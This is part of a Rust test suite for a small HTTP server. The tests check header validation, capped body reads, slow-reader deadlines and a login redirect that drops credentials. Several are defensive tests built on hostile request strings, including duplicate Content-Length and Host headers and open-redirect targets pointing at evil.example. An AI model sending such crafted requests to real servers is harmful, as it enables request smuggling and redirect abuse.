            ("GET / HTTP/1.1\r\nnocolon", 400), ("GET / HTTP/1.1\r\n folded: value", 400), ("GET / HTTP/1.1\r\nBad Name: v", 400), ("GET / HTTP/1.1\r\nX: a\rb", 400),
            ("POST / HTTP/1.1\r\nContent-Length: 12\r\nContent-Length: 13", 400), ("POST / HTTP/1.1\r\nContent-Length: +5", 400),
            ("POST / HTTP/1.1\r\nContent-Length: abc", 400), ("POST / HTTP/1.1\r\nContent-Length:", 400), ("POST / HTTP/1.1\r\nContent-Length: 99999999999999999999999", 400),
            ("POST / HTTP/1.1\r\nTransfer-Encoding: chunked", 411), ("POST / HTTP/1.1\r\nExpect: something-else", 417),
            // Ambiguity in a header we act on is refused, not resolved.
            ("GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nHost: evil.example", 400), ("POST / HTTP/1.1\r\nExpect: 100-continue\r\nExpect: 100-continue", 400),
            // A target naming another host, in either spelling browsers accept, never becomes a Location.
            ("GET //evil.example/ HTTP/1.1", 400), ("GET /\\evil.example HTTP/1.1", 400), ("GET /t/x\\y HTTP/1.1", 400),
        ] {
            assert_eq!(head(raw).err(), Some(code), "{raw:?}");
        }
        let many = format!("GET / HTTP/1.1{}", "\r\nX: y".repeat(MAX_HEADERS + 1));
        assert_eq!(head(&many).err(), Some(431));
        assert!(parse_head(b"GET /\xff HTTP/1.1").is_err());
    }

    fn pair() -> (TcpStream, TcpStream) {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        let client = TcpStream::connect(l.local_addr().unwrap()).unwrap();
        let (server, _) = l.accept().unwrap();
        client.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
        (client, server)
    }

    /// Over a real socket: a body that arrives in pieces is delivered whole; one declared over
    /// the cap is refused at once without waiting for it; one exactly at the cap is a body.
    #[test]
    fn the_reader_delivers_whole_bodies_and_refuses_oversized_ones_unread() {
        let (mut c, s) = pair();
        c.write_all(b"POST /t/x HTTP/1.1\r\nHost: localhost\r\nContent-Length: 11\r\n\r\nhello").unwrap();
        let reader = std::thread::spawn(move || read_request(s, false));
        std::thread::sleep(Duration::from_millis(100));
        c.write_all(b" world").unwrap();
        let req = reader.join().unwrap().expect("a request");
        assert_eq!(req.method, "POST");
        assert_eq!(req.url, "/t/x");
        assert_eq!(req.body, b"hello world");
        assert!(!req.oversized);
        assert_eq!(header(&req, "host"), Some("localhost"));
        req.respond(Reply::new(200, "ok".into()).with("Cache-Control", "no-store")).unwrap();
        let mut out = String::new();
        c.read_to_string(&mut out).unwrap();
        assert_eq!(out, "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok");

        let (mut c, s) = pair();
        c.write_all(format!("POST /t/x HTTP/1.1\r\nHost: localhost\r\nContent-Length: {}\r\n\r\n", MAX_BODY + 1).as_bytes()).unwrap();
        let started = Instant::now();
        let req = read_request(s, false).expect("the head is fine; the body is refused, not awaited");
        assert!(req.oversized && req.body.is_empty());
        assert!(started.elapsed() < Duration::from_secs(1), "waited for a body it must not read: {:?}", started.elapsed());

        let (mut c, s) = pair();
        let writer = std::thread::spawn(move || {
            c.write_all(format!("POST / HTTP/1.1\r\nContent-Length: {MAX_BODY}\r\n\r\n").as_bytes()).unwrap();
            c.write_all(&vec![b'a'; MAX_BODY as usize]).unwrap();
            c
        });
        let req = read_request(s, false).unwrap();
        assert_eq!(req.body.len(), MAX_BODY as usize);
        assert!(!req.oversized);
        drop(writer.join().unwrap());
    }

    /// A request the handler failed on still gets an answer, not a hanging browser tab.
    #[test]
    fn a_request_dropped_unanswered_gets_a_bare_500() {
        let (mut c, s) = pair();
        c.write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n").unwrap();
        drop(read_request(s, false).unwrap());
        let mut out = String::new();
        c.read_to_string(&mut out).unwrap();
        assert_eq!(out, "HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    }

    /// A client that hangs up before finishing is simply forgotten; a malformed one is told so.
    #[test]
    fn a_hung_up_or_malformed_client_does_not_become_a_request() {
        let (mut c, s) = pair();
        c.write_all(b"GET / HTTP/1.1\r\nHost: lo").unwrap();
        drop(c);
        assert!(read_request(s, false).is_none());
        let (mut c, s) = pair();
        c.write_all(b"PRI * HTTP/2.0\r\n\r\n").unwrap();
        assert!(read_request(s, false).is_none());
        let mut out = String::new();
        c.read_to_string(&mut out).unwrap();
        assert!(out.starts_with("HTTP/1.1 400 Bad Request\r\n"), "{out}");
    }

    /// A client that takes a large page a few bytes at a time used to hold the main thread for
    /// as long as it cared to keep reading: every partial write restarted the per-write timeout.
    /// The whole response now has one deadline, and the writer gives up at it.
    #[test]
    fn a_slowly_read_response_is_abandoned_at_the_deadline_not_per_write() {
        let (mut c, mut s) = pair();
        // Far more than loopback socket buffers absorb, so the writer must wait on the reader.
        let reply = Reply::new(200, "x".repeat(64 << 20));
        // Slow only while the writer is at work; afterwards drain at full speed so the test
        // does not spend a minute emptying socket buffers.
        let slow = Arc::new(std::sync::atomic::AtomicBool::new(true));
        let pace = Arc::clone(&slow);
        let reader = std::thread::spawn(move || {
            let mut buf = [0u8; 1024];
            let mut got = 0usize;
            loop {
                match c.read(&mut buf) {
                    Ok(0) | Err(_) => return got,
                    Ok(n) => got += n,
                }
                if pace.load(std::sync::atomic::Ordering::Relaxed) {
                    std::thread::sleep(Duration::from_millis(20));
                }
            }
        });
        let started = Instant::now();
        let res = write_reply(&mut s, &reply, false, started + Duration::from_millis(400));
        let took = started.elapsed();
        slow.store(false, std::sync::atomic::Ordering::Relaxed);
        drop(s);
        let got = reader.join().unwrap();
        let err = res.expect_err("a reader this slow cannot be served within the deadline");
        assert!(matches!(err.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock), "{err:?}");
        assert!(took < Duration::from_secs(2), "gave up only after {took:?}");
        assert!(got < reply.body.len(), "the reader took {got} bytes; the whole page cannot have fit");

        // A reader that keeps up gets a large page whole, well within the deadline.
        let (mut c, mut s) = pair();
        let reply = Reply::new(200, "y".repeat(4 << 20));
        let reader = std::thread::spawn(move || { let mut out = Vec::new(); c.read_to_end(&mut out).unwrap(); out });
        write_reply(&mut s, &reply, false, Instant::now() + Duration::from_secs(5)).unwrap();
        drop(s);
        let out = reader.join().unwrap();
        assert!(out.ends_with(reply.body.as_bytes()) && out.starts_with(b"HTTP/1.1 200 OK\r\n"));
    }

    /// The `?t=` login redirect drops the credential in every spelling parse_form would accept,
    /// re-emits nothing, and never points off this origin — the request target was refused for
    /// that at the door, and the redirect helpers refuse it again.
    #[test]
    fn the_login_redirect_drops_the_credential_in_any_spelling_and_stays_on_this_origin() {
        assert_eq!(strip_auth_params("t=PLACEHOLDER"), "");
        assert_eq!(strip_auth_params("m=hi&t=PLACEHOLDER&%74=PLACEHOLDER&t&T=keep&tt=keep&t%3Dx=keep&"), "m=hi&T=keep&tt=keep&t%3Dx=keep");
        assert_eq!(strip_auth_params("t=ONE&t=TWO"), "");
        assert_eq!(strip_auth_params(""), "");
        // The same decoding parse_form uses, so what one drops is exactly what the other would read.
        assert_eq!(parse_form("%74=v").get("t").map(String::as_str), Some("v"));
        assert!(!parse_form(&strip_auth_params("%74=v&x=1")).contains_key("t"));
        for bad in ["//evil.example/x", "/\\evil.example", "/x\\y", "http://evil.example", "relative", ""] {
            assert!(!same_origin_path(bad), "{bad:?}");
            assert_eq!(local(bad), "/");
        }
        for ok in ["/", "/t/abc", "/t/abc?m=x&y=%2F%2F"] {
            assert!(same_origin_path(ok), "{ok:?}");
            assert_eq!(local(ok), ok);
        }
        // On the wire: a foreign target becomes `/`, a same-origin one is kept, and the cookie
        // is set where the route asked — the session at `/`, a card capability at its card.
        for (to, location, name, cookie_path) in [
            ("//evil.example/", "/", inbox_auth::COOKIE, "/"),
            ("/t/abc?m=x", "/t/abc?m=x", inbox_auth::COOKIE, "/"),
            ("/p/t_abc", "/p/t_abc", inbox_auth::CAP_COOKIE, "/p/t_abc"),
        ] {
            let (mut c, s) = pair();
            c.write_all(b"GET /x HTTP/1.1\r\nHost: localhost\r\n\r\n").unwrap();
            redirect_authed(read_request(s, false).unwrap(), to, name, cookie_path, "PLACEHOLDER").unwrap();
            let mut out = String::new();
            c.read_to_string(&mut out).unwrap();
            assert!(out.starts_with("HTTP/1.1 303 See Other\r\n"), "{out}");
            assert!(out.contains(&format!("\r\nLocation: {location}\r\n")), "{out}");
            assert!(out.contains(&format!("\r\nSet-Cookie: {name}=PLACEHOLDER; Path={cookie_path}; HttpOnly; SameSite=Strict\r\n")), "{out}");
            assert!(!out.contains("evil"), "{out}");
        }
    }
}
